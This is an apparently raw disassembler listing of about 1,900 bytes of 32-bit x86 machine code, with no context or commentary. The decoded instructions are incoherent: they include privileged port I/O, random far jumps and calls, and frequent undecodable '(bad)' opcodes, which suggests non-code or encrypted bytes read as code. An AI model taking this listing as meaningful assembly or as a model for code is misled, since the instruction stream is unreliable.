  414059:	daa    
  41405a:	jmp    FWORD PTR [esi-0x7ae83f74]
  414060:	cmp    al,0x62
  414062:	repz add eax,0x912b44cf
  414068:	mov    dh,0x1
  41406a:	pop    edx
  41406b:	lods   al,BYTE PTR ds:[esi]
  41406c:	scas   eax,DWORD PTR es:[edi]
  41406d:	sti    
  41406e:	cmp    BYTE PTR [eax+0x4c],0x9d
  414072:	push   ds
  414073:	test   BYTE PTR [eax],ch
  414075:	dec    ebp
  414076:	les    edx,FWORD PTR [edx+0x3e]
  414079:	pop    es
  41407a:	fild   WORD PTR [ecx+edi*4]
  41407d:	das    
  41407e:	mov    edi,0x7d3a2a5e
  414083:	scas   al,BYTE PTR es:[edi]
  414084:	(bad)  
  414085:	lahf   
  414086:	out    dx,al
  414087:	cmc    
  414088:	sbb    BYTE PTR [eax-0x1a375ea6],al
  41408e:	pop    edi
  41408f:	outs   dx,DWORD PTR ds:[esi]
  414090:	test   esi,esp
  414092:	and    DWORD PTR [edx],ebx
  414094:	xor    cl,BYTE PTR [ebp-0x170167a0]
  41409a:	xchg   edx,eax
  41409b:	jg     0x4140f9
  41409d:	ret    
  41409e:	inc    ecx
  41409f:	push   esp
  4140a0:	jns    0x4140e8
  4140a2:	cmp    BYTE PTR [ebp+0x18],al
  4140a5:	cdq    
  4140a6:	jbe    0x4140a9
  4140a8:	ds dec ebx
  4140aa:	jmp    0x4140ed
  4140ac:	xchg   esp,eax
  4140ad:	jnp    0x4140dc
  4140af:	mov    dh,0x42
  4140b1:	int    0xbf
  4140b3:	mov    esi,0x4b93751
  4140b8:	mov    esp,0x2b8f4873
  4140bd:	test   DWORD PTR [ecx+0x4],edx
  4140c0:	aas    
  4140c1:	mov    al,0xc4
  4140c3:	lea    edx,[ebp-0x19]
  4140c6:	push   esp
  4140c7:	js     0x414077
  4140c9:	mov    ds:0x675d564d,eax
  4140ce:	lahf   
  4140cf:	or     cl,ah
  4140d1:	je     0x41412f
  4140d3:	cli    
  4140d4:	pop    ecx
  4140d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4140d6:	jmp    0x4140b3
  4140d8:	iret   
  4140d9:	out    0xb2,al
  4140db:	adc    cl,BYTE PTR [edi-0x71]
  4140de:	add    DWORD PTR [edx-0x64],0x30
  4140e2:	and    dh,al
  4140e4:	stos   DWORD PTR es:[edi],eax
  4140e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4140e6:	pop    edx
  4140e7:	inc    esi
  4140e8:	std    
  4140e9:	pop    ds
  4140ea:	xor    al,0x4e
  4140ec:	arpl   bx,di
  4140ee:	xchg   BYTE PTR [eax-0x47],dl
  4140f1:	nop
  4140f2:	push   ebp
  4140f3:	and    edx,DWORD PTR [ebx+0x50]
  4140f6:	sbb    edx,ecx
  4140f8:	aaa    
  4140f9:	psubw  mm3,QWORD PTR [eax+0x4e]
  4140fd:	jl     0x41411b
  4140ff:	add    edi,DWORD PTR [eax-0x3]
  414102:	pop    ebx
  414103:	mov    bh,0x7e
  414105:	xchg   ebp,eax
  414106:	pop    esp
  414107:	fdivr  QWORD PTR [esi]
  414109:	out    dx,al
  41410a:	leave  
  41410b:	cmc    
  41410c:	xor    eax,0x3e136c7f
  414111:	or     ecx,DWORD PTR [ecx+0x60120cfe]
  414117:	aas    
  414118:	push   esp
  414119:	out    0x38,eax
  41411b:	pop    eax
  41411c:	rcl    BYTE PTR [ebp+0x5],cl
  41411f:	mov    edx,0x1d39472
  414124:	test   DWORD PTR [eax],eax
  414126:	pop    edx
  414127:	pop    esp
  414128:	jns    0x41411b
  41412a:	push   ebp
  41412b:	dec    ebx
  41412c:	es stos DWORD PTR es:[edi],eax
  41412e:	push   ds
  41412f:	test   DWORD PTR [esi+0x3fdddb39],ebp
  414135:	xchg   ebx,eax
  414136:	sub    ebx,0x65742439
  41413c:	icebp  
  41413d:	adc    al,0xf2
  41413f:	xor    dl,BYTE PTR [esi]
  414141:	loope  0x414199
  414143:	mov    esi,DWORD PTR [esi]
  414145:	(bad)  
  414147:	into   
  414148:	stos   BYTE PTR es:[edi],al
  414149:	mov    bh,0xdb
  41414b:	mov    edi,DWORD PTR [edi]
  41414d:	or     eax,0xcad5ee8a
  414152:	addr16 push es
  414154:	das    
  414155:	add    edi,esi
  414157:	mov    al,dh
  414159:	cmp    ebp,DWORD PTR [edi+0x2c8779b]
  41415f:	mov    dh,0xa5
  414161:	xchg   DWORD PTR [eax-0x7b],edi
  414164:	ds stc 
  414166:	cli    
  414167:	retf   
  414168:	jmp    0x4141b1
  41416a:	outs   dx,BYTE PTR ds:[esi]
  41416b:	cwde   
  41416c:	xor    ch,BYTE PTR [esi]
  41416e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41416f:	gs (bad) 
  414171:	(bad)  
  414172:	in     eax,dx
  414173:	test   BYTE PTR [eax+0x2f],bh
  414176:	lahf   
  414177:	out    0x30,al
  414179:	aad    0x1e
  41417b:	xor    eax,0x87eb15cf
  414180:	dec    esp
  414181:	rcr    BYTE PTR [eax-0x5a71cee6],0x85
  414188:	fdiv   QWORD PTR [eax+0xe]
  41418b:	test   edx,ecx
  41418d:	push   esi
  41418e:	iret   
  41418f:	pop    edi
  414190:	aas    
  414191:	mov    DWORD PTR [eax-0x7f],eax
  414194:	in     eax,0xbc
  414196:	inc    ecx
  414197:	fsubr  st,st(2)
  414199:	adc    ah,bh
  41419b:	and    eax,0xb81bf7a4
  4141a0:	(bad)  
  4141a2:	fadd   DWORD PTR [ebp-0x4c9863b0]
  4141a8:	int    0xa6
  4141aa:	pop    ebx
  4141ab:	adc    BYTE PTR [esi],dh
  4141ad:	mov    ah,0xd7
  4141af:	xchg   ecx,eax
  4141b0:	push   cs
  4141b1:	dec    edx
  4141b2:	pop    ss
  4141b3:	test   ah,cl
  4141b5:	popf   
  4141b6:	int3   
  4141b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4141b8:	ds pop ebp
  4141ba:	or     ecx,DWORD PTR [edi-0x1]
  4141bd:	call   0xedb66633
  4141c2:	jbe    0x414148
  4141c4:	xchg   ebp,eax
  4141c5:	jecxz  0x414207
  4141c7:	mov    edx,0x85fede87
  4141cc:	aas    
  4141cd:	jg     0x41415f
  4141cf:	fdivr  QWORD PTR [eax]
  4141d1:	ret    0xb1bf
  4141d4:	imul   edi,DWORD PTR [edi-0x51c7a2f0],0xb7a8eb08
  4141de:	retf   
  4141df:	test   DWORD PTR [ecx-0xbe892b8],ebx
  4141e5:	clc    
  4141e6:	fisttp DWORD PTR [ebp+0x3850f8be]
  4141ec:	fisub  WORD PTR [ecx+0xfda4a6c]
  4141f2:	call   0x5ef7:0xaf853f23
  4141f9:	lea    esp,[edx+0x1b]
  4141fc:	push   ss
  4141fd:	push   edi
  4141fe:	out    dx,al
  4141ff:	fistp  QWORD PTR [edi]
  414201:	dec    edi
  414202:	dec    ecx
  414203:	and    bh,BYTE PTR [eax-0x62]
  414206:	jle    0x414285
  414208:	aas    
  414209:	retf   
  41420a:	iret   
  41420b:	sti    
  41420c:	fucomip st,st(6)
  41420e:	and    ecx,0x7c
  414211:	jmp    0x1de5ddc2
  414216:	inc    edx
  414217:	cmp    al,0x8a
  414219:	pusha  
  41421a:	xchg   edi,eax
  41421b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41421c:	ds xchg ebx,eax
  41421e:	pushf  
  41421f:	aas    
  414220:	mov    dl,0x24
  414222:	in     eax,0x31
  414224:	aaa    
  414225:	lahf   
  414226:	call   0x5220:0xda853e89
  41422d:	loop   0x414232
  41422f:	jmp    0xf3b9:0x81deff3e
  414236:	sbb    al,0xc
  414238:	pop    ebp
  414239:	out    0x90,al
  41423b:	aam    0xf0
  41423d:	jns    0x4142ac
  41423f:	sti    
  414240:	mov    DWORD PTR [edi+0x59],esp
  414243:	push   ecx
  414244:	cdq    
  414245:	sub    BYTE PTR [ebx+0x12],bl
  414248:	add    esi,eax
  41424a:	retf   0x6007
  41424d:	sbb    esi,ebx
  41424f:	test   BYTE PTR [esi],bl
  414251:	pop    ds
  414252:	push   ebp
  414253:	jne    0x41426f
  414255:	and    eax,0x3938986c
  41425a:	call   FWORD PTR [ecx-0x39]
  41425d:	pop    ss
  41425e:	mov    edi,0x86e701ef
  414263:	xor    ebp,ebp
  414265:	dec    ecx
  414266:	mov    cl,0xfb
  414268:	mov    dh,BYTE PTR [ebx]
  41426a:	xor    DWORD PTR [ecx+ebx*8+0x3f],edx
  41426e:	pop    ebx
  41426f:	push   ss
  414270:	and    BYTE PTR [ebx+esi*4+0x428b084c],ch
  414277:	test   DWORD PTR [edi+ebx*4+0x3d5ebd52],ebp
  41427e:	mov    al,ds:0x3e240e60
  414283:	std    
  414284:	jl     0x414305
  414286:	pop    ss
  414287:	xor    BYTE PTR [eax+0x22],0x45
  41428b:	push   ecx
  41428c:	data16 or bl,ch
  41428f:	stc    
  414290:	mov    dl,0x2a
  414292:	jbe    0x4142f0
  414294:	pop    ss
  414295:	fs pop edx
  414297:	dec    edx
  414298:	pop    ds
  414299:	cdq    
  41429a:	lock and DWORD PTR [ebx-0x49],0x36
  41429f:	xor    eax,0x843d642a
  4142a4:	adc    edx,DWORD PTR [edi-0x64]
  4142a7:	xchg   DWORD PTR [ebx-0x65],esp
  4142aa:	pop    edx
  4142ab:	xchg   esp,eax
  4142ac:	pop    ebx
  4142ad:	pusha  
  4142ae:	mov    edx,0x5a27fc25
  4142b3:	test   DWORD PTR [esi],edx
  4142b5:	(bad)  
  4142b6:	or     DWORD PTR ds:0x9aed1922,ebp
  4142bc:	sub    eax,0xfd896da0
  4142c1:	jbe    0x41425e
  4142c3:	mov    ebp,0xf35d1e54
  4142c8:	ins    BYTE PTR es:[edi],dx
  4142c9:	add    al,0x58
  4142cb:	mov    eax,0x98fcac15
  4142d0:	dec    esp
  4142d1:	das    
  4142d2:	fidivr DWORD PTR [edi+0x17]
  4142d5:	sub    ebp,DWORD PTR [eax+0x32e40d9a]
  4142db:	fstp   TBYTE PTR [ebx+ecx*8]
  4142de:	pop    esp
  4142df:	sahf   
  4142e0:	(bad)  
  4142e1:	push   ds
  4142e2:	addr16 aaa 
  4142e4:	push   0xffffffdd
  4142e6:	or     al,BYTE PTR [ebp+0x79975dcd]
  4142ec:	jns    0x41436c
  4142ee:	mov    edi,0x5a11e1a9
  4142f3:	xlat   BYTE PTR ds:[ebx]
  4142f4:	xor    al,ah
  4142f6:	pop    edx
  4142f7:	repnz sub al,0x67
  4142fa:	add    eax,0x3ce61b6c
  4142ff:	push   esp
  414300:	cmc    
  414301:	nop
  414302:	in     eax,dx
  414303:	and    BYTE PTR [edi-0x8df144],ah
  414309:	and    eax,0x6c95645a
  41430e:	bound  ebp,QWORD PTR [edx]
  414310:	je     0x414351
  414312:	adc    eax,0x1b506c84
  414317:	jmp    0xf985363d
  41431c:	pusha  
  41431d:	jns    0x4142d0
  41431f:	add    eax,DWORD PTR es:[ecx+0x176a05c3]
  414326:	arpl   WORD PTR [eax+ebp*8],ax
  414329:	(bad)  
  41432b:	test   ecx,ecx
  41432d:	ror    DWORD PTR [edx-0x1bbec1b1],1
  414333:	fs dec eax
  414335:	pop    ebx
  414336:	(bad)  
  414337:	xor    dl,BYTE PTR [ebx]
  414339:	xlat   BYTE PTR ds:[ebx]
  41433a:	iret   
  41433b:	or     BYTE PTR [edi+esi*8+0x2d9eaa23],0x1c
  414343:	test   dl,bl
  414345:	sub    BYTE PTR [edi],ah
  414347:	pushf  
  414348:	sub    DWORD PTR [esi+eiz*1-0x5a42e974],ebx
  41434f:	test   edx,edx
  414351:	push   0xf70c1aad
  414356:	icebp  
  414357:	test   DWORD PTR [ecx+0x3e906f95],eax
  41435d:	loope  0x4142fe
  41435f:	push   ecx
  414360:	pop    edi
  414361:	push   ss
  414362:	cdq    
  414363:	dec    ecx
  414364:	call   0x6a87276e
  414369:	stos   BYTE PTR es:[edi],al
  41436a:	cmp    eax,0x9b5f53e4
  41436f:	push   es
  414370:	sti    
  414371:	sub    eax,0xd3b25b
  414376:	lods   al,BYTE PTR es:[esi]
  414378:	sub    BYTE PTR [edx+eiz*1],0x83
  41437c:	lods   al,BYTE PTR ds:[esi]
  41437d:	mov    DWORD PTR [ebp+esi*2+0xd],ebx
  414381:	aas    
  414382:	or     ebx,DWORD PTR ds:0xa445c283
  414388:	mov    ds:0x4304ac12,al
  41438d:	xchg   edi,eax
  41438e:	nop
  41438f:	cmp    DWORD PTR [edi],0x909f6946
  414395:	in     eax,dx
  414396:	loope  0x41434e
  414398:	aas    
  414399:	das    
  41439a:	mov    eax,0x2bf6bbae
  41439f:	nop
  4143a0:	jae    0x414389
  4143a2:	(bad)  
  4143a3:	mov    al,0xb0
  4143a5:	aas    
  4143a6:	or     DWORD PTR [ecx-0x13],esp
  4143a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4143aa:	rcl    al,1
  4143ac:	mov    ah,0xa6
  4143ae:	pop    ebx
  4143af:	cld    
  4143b0:	push   ss
  4143b1:	(bad)  [eax+0x673f91b9]
  4143b7:	mov    ch,0xe8
  4143b9:	out    0xc4,al
  4143bb:	jns    0x41437f
  4143bd:	div    DWORD PTR [eax-0x61]
  4143c0:	test   BYTE PTR [edi+0x4d],dl
  4143c3:	xor    al,0xd7
  4143c5:	or     BYTE PTR [edx-0x54],bl
  4143c8:	dec    edi
  4143c9:	and    al,0x54
  4143cb:	gs cs push cs
  4143ce:	sub    al,0xcc
  4143d0:	fs adc al,0x53
  4143d3:	fwait
  4143d4:	ds push ds
  4143d6:	mov    BYTE PTR [edx+0x40],dl
  4143d9:	push   ebp
  4143da:	ss stos DWORD PTR es:[edi],eax
  4143dc:	inc    BYTE PTR [ebp+edx*2-0x580dc608]
  4143e3:	daa    
  4143e4:	push   ebp
  4143e5:	dec    edx
  4143e6:	adc    edi,eax
  4143e8:	out    0xe7,eax
  4143ea:	cmp    BYTE PTR [ecx],0xee
  4143ed:	mov    eax,ds:0x6c0f4bae
  4143f2:	out    dx,eax
  4143f3:	std    
  4143f4:	aas    
  4143f5:	add    DWORD PTR [ebx-0x17],ebp
  4143f8:	dec    ebp
  4143f9:	and    al,0x9c
  4143fb:	lahf   
  4143fc:	xchg   dh,ah
  4143fe:	lods   al,BYTE PTR ds:[esi]
  4143ff:	push   0xffffffff
  414401:	and    BYTE PTR [esp+eiz*2+0x1],bh
  414405:	mov    ebp,0xe35338b3
  41440a:	sub    eax,0x4d579184
  41440f:	arpl   WORD PTR [ecx-0x2],sp
  414412:	mov    ecx,0xb4c12604
  414417:	test   BYTE PTR [ebx],dh
  414419:	pop    ebx
  41441a:	(bad)  
  41441b:	in     al,0x73
  41441d:	inc    ebx
  41441e:	push   ebp
  41441f:	sbb    edi,DWORD PTR [edi]
  414421:	jne    0x4143c6
  414423:	inc    edx
  414424:	pop    ds
  414425:	icebp  
  414426:	fsubr  st,st(6)
  414428:	mov    esi,0x8d856fc7
  41442d:	enter  0x14f7,0x3e
  414431:	test   eax,0x6b61259
  414436:	mov    dl,0x36
  414438:	xchg   BYTE PTR [esi],dl
  41443a:	push   eax
  41443b:	cld    
  41443c:	ret    0xad4
  41443f:	test   BYTE PTR [ebp-0x15],ah
  414442:	mov    esp,DWORD PTR [esi-0x5715b6c8]
  414448:	mov    fs,esp
  41444a:	xor    ah,BYTE PTR [ecx+eax*1]
  41444d:	jmp    0x8583:0xc108c43e
  414454:	sub    al,0x17
  414456:	push   cs
  414457:	retf   
  414458:	aas    
  414459:	das    
  41445a:	jle    0x414414
  41445c:	pop    edi
  41445d:	cmc    
  41445e:	jne    0x414472
  414460:	stos   BYTE PTR es:[edi],al
  414461:	in     al,0x78
  414463:	out    0xf9,eax
  414465:	add    al,0xe6
  414467:	mov    dh,0x16
  414469:	inc    edi
  41446a:	stos   DWORD PTR es:[edi],eax
  41446b:	mov    DWORD PTR [esi],edi
  41446d:	sti    
  41446e:	stc    
  41446f:	xchg   ebp,eax
  414470:	cmp    DWORD PTR [edx],0x5f
  414473:	push   cs
  414474:	sahf   
  414475:	out    0x26,eax
  414477:	out    0x1d,eax
  414479:	retf   0x9367
  41447c:	pop    esp
  41447d:	in     al,0xa0
  41447f:	push   edi
  414480:	ins    BYTE PTR es:[edi],dx
  414481:	loop   0x4144d8
  414483:	mov    al,0x9e
  414485:	(bad)  
  414486:	jnp    0x4144fb
  414488:	jmp    esi
  41448a:	push   0x66299167
  41448f:	mov    ss,WORD PTR [ecx+edx*2-0x20c193d7]
  414496:	mov    ebx,0x395aaa20
  41449b:	stos   DWORD PTR es:[edi],eax
  41449c:	and    esi,esp
  41449e:	dec    eax
  41449f:	leave  
  4144a0:	dec    ecx
  4144a1:	adc    eax,0x573273b
  4144a6:	mov    al,ds:0xaa693e60
  4144ab:	sbb    BYTE PTR [edx+0x75],0xc0
  4144af:	push   edi
  4144b0:	add    al,0xf8
  4144b2:	xor    bh,BYTE PTR [eax+0x4de46566]
  4144b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4144b9:	js     0x414496
  4144bb:	pop    edi
  4144bc:	aas    
  4144bd:	mov    ds:0x3000e836,eax
  4144c2:	fwait
  4144c3:	xor    bh,cl
  4144c5:	out    0x2a,al
  4144c7:	(bad)  
  4144c8:	out    dx,al
  4144c9:	rcl    BYTE PTR [edi],cl
  4144cb:	xor    eax,0x248bd6
  4144d0:	rcl    DWORD PTR ds:[edx-0x240d57a7],cl
  4144d7:	cmp    BYTE PTR [edx-0x3aafb11a],bh
  4144dd:	out    0xd1,al
  4144df:	mov    ds:0x581a4431,al
  4144e4:	jne    0x414480
  4144e6:	pop    edx
  4144e7:	les    edi,FWORD PTR [eax+0x35]
  4144ea:	ja     0x4144a5
  4144ec:	mov    dh,0x64
  4144ee:	cmp    al,0x86
  4144f0:	das    
  4144f1:	mov    al,0x88
  4144f3:	nop
  4144f4:	add    DWORD PTR [ebx],edx
  4144f6:	je     0x41455d
  4144f8:	jecxz  0x41455c
  4144fa:	pop    ebx
  4144fb:	adc    ah,BYTE PTR [ebp+0x42897e7a]
  414501:	add    DWORD PTR [edx],esp
  414503:	test   BYTE PTR [edi-0xd],ch
  414506:	ret    
  414507:	pop    esi
  414508:	aas    
  414509:	ja     0x4144bf
  41450b:	fnstcw WORD PTR [ecx+0xe]
  41450e:	scas   eax,DWORD PTR es:[edi]
  41450f:	cmp    DWORD PTR [edx],eax
  414511:	loop   0x4144bb
  414513:	mov    ds:0x130995b4,eax
  414518:	(bad)  
  414519:	pusha  
  41451a:	dec    esp
  41451b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41451c:	(bad)  
  41451d:	call   0x41c0156d
  414522:	pop    ebx
  414523:	sub    ch,BYTE PTR [ecx+0x3d]
  414526:	out    0x5e,al
  414528:	add    BYTE PTR [edx-0x60],ah
  41452b:	test   BYTE PTR [eax],bl
  41452d:	fbstp  TBYTE PTR [ebp+ebx*8+0x39]
  414531:	(bad)  
  414532:	xchg   ebp,eax
  414533:	mov    bl,0x22
  414535:	fisubr DWORD PTR [ecx-0x1a]
  414538:	mov    ds:0x82155e25,eax
  41453d:	lock mov esp,DWORD PTR fs:[esi+0x1f0d9a61]
  414545:	mov    edx,0xaf397d48
  41454a:	inc    ecx
  41454b:	mul    BYTE PTR [edx+0x1f210a77]
  414551:	cmp    cl,BYTE PTR [edx-0x2f186a15]
  414557:	es and al,0x74
  41455a:	cwde   
  41455b:	mov    dh,0xb7
  41455d:	iret   
  41455e:	pusha  
  41455f:	mov    cl,0x72
  414561:	push   edx
  414562:	push   esi
  414563:	or     BYTE PTR [esi],0xe7
  414566:	fidivr DWORD PTR ss:[ebp+0x61fb0c16]
  41456d:	cmp    al,bl
  41456f:	call   0xf69f79ff
  414574:	sahf   
  414575:	daa    
  414576:	ja     0x41454b
  414578:	loope  0x414560
  41457a:	mov    esp,0x7791675f
  41457f:	outs   dx,BYTE PTR ds:[esi]
  414580:	je     0x414547
  414582:	and    dh,BYTE PTR [esi-0x32]
  414585:	sbb    ah,BYTE PTR [esi-0x5c]
  414588:	neg    DWORD PTR [edi-0x21]
  41458b:	cmp    ecx,esp
  41458d:	cwde   
  41458e:	cmp    al,BYTE PTR [edx+edx*8]
  414591:	cmp    al,0x6
  414593:	test   eax,ecx
  414595:	jno    0x414528
  414597:	je     0x41455c
  414599:	test   eax,0xe6e29496
  41459e:	ret    0xa1c6
  4145a1:	loope  0x4145d2
  4145a3:	mov    DWORD PTR [ebx],esp
  4145a5:	out    0x54,al
  4145a7:	fisubr WORD PTR [ebx-0x727bd950]
  4145ad:	stc    
  4145ae:	fucom  st(1)
  4145b0:	scas   al,BYTE PTR es:[edi]
  4145b1:	jne    0x41460c
  4145b3:	repnz gs (bad) 
  4145b6:	mul    DWORD PTR [ecx+esi*2-0xf]
  4145ba:	rol    BYTE PTR [ecx],cl
  4145bc:	dec    edx
  4145bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4145be:	outs   dx,BYTE PTR ds:[esi]
  4145bf:	push   0x475b382c
  4145c4:	pop    ds
  4145c5:	mov    dh,0x2b
  4145c7:	repz aas 
  4145c9:	push   DWORD PTR [esi-0x5aa7b2d5]
  4145cf:	push   ds
  4145d0:	retf   0x619
  4145d3:	popa   
  4145d4:	cld    
  4145d5:	xor    al,0xac
  4145d7:	test   BYTE PTR [ecx-0x47],ah
  4145da:	jg     0x41463b
  4145dc:	dec    edx
  4145dd:	popa   
  4145de:	xchg   edx,eax
  4145df:	sub    ebx,0xe38474de
  4145e5:	in     eax,dx
  4145e6:	xchg   edi,eax
  4145e7:	lds    eax,FWORD PTR [eax]
  4145e9:	sub    al,0x4b
  4145eb:	test   BYTE PTR [esi+0x3e],cl
  4145ee:	push   esi
  4145ef:	sar    DWORD PTR [ecx],1
  4145f1:	aad    0xf9
  4145f3:	push   ebp
  4145f4:	cmp    ecx,DWORD PTR [esi]
  4145f6:	mov    BYTE PTR [ecx],cl
  4145f8:	loope  0x4145d5
  4145fa:	sub    BYTE PTR [edi],dh
  4145fc:	dec    ecx
  4145fd:	jge    0x4145a5
  4145ff:	les    ecx,FWORD PTR [edx+0x14725df1]
  414605:	mov    bh,0x65
  414607:	nop
  414608:	retf   
  414609:	out    0xfa,eax
  41460b:	inc    ecx
  41460c:	jmp    0xa57f:0x861b5379
  414613:	imul   edx,DWORD PTR [ebx-0x73a1a497],0x5209e1bb
  41461d:	sbb    ch,BYTE PTR ds:0x82e5a684
  414623:	nop
  414624:	adc    bl,bh
  414626:	mov    esp,0xb31d3f06
  41462b:	or     ecx,DWORD PTR [esi+0x14d5cbed]
  414631:	push   edi
  414632:	add    ebx,ecx
  414634:	hlt    
  414635:	cmp    eax,0x2e2f8511
  41463a:	sub    esp,DWORD PTR [ecx-0x45]
  41463d:	mov    bl,0x5b
  41463f:	xchg   edx,eax
  414640:	ret    
  414641:	ins    BYTE PTR es:[edi],dx
  414642:	xchg   ecx,eax
  414643:	aas    
  414644:	imul   DWORD PTR fs:[esi]
  414647:	test   DWORD PTR [esp+edi*1],eax
  41464a:	pop    ebx
  41464b:	fldcw  WORD PTR ds:0xed4da05f
  414651:	out    0x85,eax
  414653:	jae    0x414609
  414655:	inc    edx
  414656:	test   al,0x7a
  414658:	sub    al,0xa0
  41465a:	mov    esp,0x5cd154f0
  41465f:	in     al,dx
  414660:	jle    0x4146d4
  414662:	mov    cl,0x54
  414664:	aas    
  414665:	mov    ebx,0x6fc6df0d
  41466a:	fstp   st(0)
  41466c:	ss out 0xa8,eax
  41466f:	aad    0xc
  414671:	sub    eax,0xb558c6
  414676:	xor    al,0xfd
  414678:	cmp    BYTE PTR [ebx],ah
  41467a:	pop    edx
  41467b:	mov    BYTE PTR [ecx+edi*8-0x58],bh
  41467f:	adc    BYTE PTR [edx+eax*4+0x2aa885fe],dl
  414686:	jno    0x4146ec
  414688:	aas    
  414689:	xchg   ebp,eax
  41468a:	mov    al,ds:0xa56aa07d
  41468f:	add    BYTE PTR ds:0xbfee5ce6,cl
  414695:	stc    
  414696:	scas   eax,DWORD PTR es:[edi]
  414697:	lds    ebp,FWORD PTR [ebx]
  414699:	fsubr  QWORD PTR [ebp-0x7ce8c38a]
  41469f:	adc    DWORD PTR [ecx-0x29e984c9],edi
  4146a5:	(bad)  
  4146a6:	mov    bl,0x22
  4146a8:	mov    gs,WORD PTR [ebx]
  4146aa:	xor    DWORD PTR [ebx+0x16],esi
  4146ad:	xor    eax,0x18b8fe1d
  4146b2:	pop    edx
  4146b3:	push   0xffffffef
  4146b5:	push   ebp
  4146b6:	dec    ebx
  4146b7:	push   ss
  4146b8:	aas    
  4146b9:	adc    ebp,DWORD PTR [esi+0x35f47f3e]
  4146bf:	adc    DWORD PTR [ebp-0x7fcc0127],0x68
  4146c6:	jb     0x414715
  4146c8:	xchg   ecx,eax
  4146c9:	push   es
  4146ca:	fucomp st(7)
  4146cc:	fidiv  DWORD PTR [edx-0x3a]
  4146cf:	out    0x22,eax
  4146d1:	out    0x2f,al
  4146d3:	and    ah,ch
  4146d5:	xchg   esp,eax
  4146d6:	stos   DWORD PTR es:[edi],eax
  4146d7:	dec    esi
  4146d8:	stos   BYTE PTR es:[edi],al
  4146d9:	out    0xf6,al
  4146db:	and    eax,0xed137529
  4146e0:	frstor [ebp+0x1d]
  4146e3:	into   
  4146e4:	lods   eax,DWORD PTR ds:[esi]
  4146e5:	push   ecx
  4146e6:	arpl   WORD PTR [esi+0x41],bx
  4146e9:	rcr    dl,1
  4146eb:	and    BYTE PTR [edx-0x63],cl
  4146ee:	repnz pop esi
  4146f0:	xchg   DWORD PTR [edi],ecx
  4146f2:	int    0x31
  4146f4:	sti    
  4146f5:	dec    ebp
  4146f6:	push   ebp
  4146f7:	pop    edx
  4146f8:	and    dh,dh
  4146fa:	jl     0x4146a0
  4146fc:	aas    
  4146fd:	sub    eax,DWORD PTR [eax]
  4146ff:	sub    BYTE PTR [ebp+ebx*4-0x28369b0a],cl
  414706:	push   ebp
  414707:	xor    BYTE PTR [eax],dl
  414709:	pop    edx
  41470a:	ins    BYTE PTR es:[edi],dx
  41470b:	hlt    
  41470c:	add    edi,DWORD PTR [edi]
  41470e:	pop    edx
  41470f:	pop    es
  414710:	pop    ebp
  414711:	xchg   ebp,eax
  414712:	enter  0xfcd7,0xe7
  414716:	es push esi
  414718:	das    
  414719:	out    dx,eax
  41471a:	ret    0xce6e
  41471d:	out    0x24,al
  41471f:	cmp    BYTE PTR [esi+0x43a9117d],ch
  414725:	stc    
  414726:	mov    eax,0x5c4d4c8a
  41472b:	(bad)
  414730:	push   cs
  414731:	out    0xa4,al
  414733:	pop    esi
  414734:	xchg   edx,eax
  414735:	pop    ebp
  414736:	je     0x41476b
  414738:	icebp  
  414739:	retf   0x6bd9
  41473c:	inc    esi
  41473d:	imul   esi,DWORD PTR [ebx-0x59fdc0bb],0x86980d85
  414747:	pop    edi
  414748:	out    0x64,al
  41474a:	xor    bh,cl
  41474c:	fstp   QWORD PTR [ebp+0x57f32559]
  414752:	xlat   BYTE PTR ds:[ebx]
  414753:	fadd   QWORD PTR [eax]
  414755:	icebp  
  414756:	mov    ds:0x9987b8e1,eax
  41475b:	xchg   eax,esp
  41475d:	mov    dh,0x11
  41475f:	fcomp  QWORD PTR [edx-0x1a]
  414762:	out    0x30,al
  414764:	add    eax,0x771dac
  414769:	(bad)  
  41476a:	out    dx,al
  41476b:	adc    esp,DWORD PTR [ebx]
  41476d:	int    0xba
  41476f:	pop    ebp
  414770:	stos   DWORD PTR es:[edi],eax
  414771:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414772:	or     bh,dl
  414774:	in     eax,dx
  414775:	inc    edx
  414776:	mov    esi,0x5fe4b0b8
  41477b:	test   BYTE PTR [edx+ecx*2+0x6],ch
  41477f:	lds    eax,FWORD PTR [edx]
  414781:	and    eax,DWORD PTR [edx]
  414783:	mov    edx,0xcff365be
  414788:	retf   
  414789:	or     edi,DWORD PTR [edi+0x7c5c2870]
  41478f:	test   ebx,esi
  414791:	int3   
  414792:	bound  edx,QWORD PTR [edi+edi*1-0x3a7b46b7]
  414799:	call   0x6fe2:0xe1476b59
  4147a0:	test   DWORD PTR [ebp-0x33],ebp
  4147a3:	pop    esi
  4147a4:	into   
  4147a5:	inc    esi
  4147a6:	inc    ebx
  4147a7:	das    
  4147a8:	aas    
  4147a9:	mov    cl,0x4d
  4147ab:	jmp    0xe7c8:0x2249e91b
  4147b2:	into   
  4147b3:	(bad)  
  4147b4:	aaa    
  4147b5:	and    al,0xe9
  4147b7:	cdq    
  4147b8:	sub    al,ch
  4147ba:	nop
  4147bb:	sub    al,0x0
  4147bd:	pusha  
  4147be:	pop    edx
  4147bf:	(bad)  
  4147c0:	jg     0x414818
  4147c2:	into   
  4147c3:	cli    
  4147c4:	ss aas 
  4147c6:	xchg   BYTE PTR [ebp+0x6b6a18],al
  4147cc:	aas    
  4147cd:	dec    ebp
  4147ce:	loopne 0x414801
  4147d0:	rcl    edx,1
  4147d2:	mov    ebx,0x24e75510
  4147d7:	mov    eax,ds:0x4c680b8d
  4147dc:	scas   al,BYTE PTR es:[edi]
  4147dd:	pop    ebp
  4147de:	xchg   edi,eax
  4147df:	cdq    
  4147e0:	pusha  
  4147e1:	fist   DWORD PTR [ebx]
  4147e3:	je     0x4147ad
  4147e5:	pop    ecx
  4147e6:	pop    edx
  4147e7:	mov    WORD PTR [eax-0x6d],cs
  4147ea:	sahf   
  4147eb:	mov    DWORD PTR [eax],edi
  4147ed:	fist   WORD PTR [ecx+0xb1e45d1]
  4147f3:	and    esp,DWORD PTR [edi+0x48]
  4147f6:	sub    ebp,DWORD PTR [edi]
